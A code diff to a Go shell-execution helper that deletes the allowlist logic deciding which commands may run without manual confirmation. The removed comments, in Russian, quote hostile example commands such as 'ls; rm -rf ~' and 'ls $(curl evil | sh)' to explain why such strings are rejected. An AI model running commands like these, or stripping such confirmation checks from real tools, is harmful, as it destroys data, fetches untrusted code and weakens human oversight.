@@ -6,7 +6,6 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
-	"strings"
 	"time"
 	"unicode/utf8"
 )
@@ -175,38 +174,4 @@ func execShell(command string, timeout time.Duration) execResult {
 	}
 	res.output = capped.String()
 	return res
-}
-
-// --- разрешённые команды ---
-
-// commandName — первое слово команды, по нему работает список
-// разрешённых. Ведущие присваивания переменных (FOO=bar cmd) пропускаем,
-// иначе `FOO=1 ls` считался бы командой "FOO=1".
-func commandName(command string) string {
-	for _, f := range strings.Fields(command) {
-		if strings.Contains(f, "=") && !strings.HasPrefix(f, "=") {
-			continue
-		}
-		if i := strings.LastIndex(f, "/"); i >= 0 {
-			f = f[i+1:]
-		}
-		return f
-	}
-	return ""
-}
-
-// isSimpleCommand — можно ли доверять первому слову как имени команды.
-// Строка уходит в sh -c, поэтому «начинается на ls» ничего не гарантирует:
-// `ls; rm -rf ~` и `ls $(curl evil | sh)` тоже начинаются на ls. Разрешаем
-// автоподтверждение только для строк без операторов, перенаправлений и
-// подстановок. Это проверка набора символов, а не разбор грамматики шелла —
-// всё сомнительное просто уходит на ручное подтверждение.
-func isSimpleCommand(command string) bool {
-	if strings.ContainsAny(command, ";&|<>\n\r(){}") {
-		return false
-	}
-	if containsAny(command, "$(", "${", "`", "$((") {
-		return false
-	}
-	return true
 }
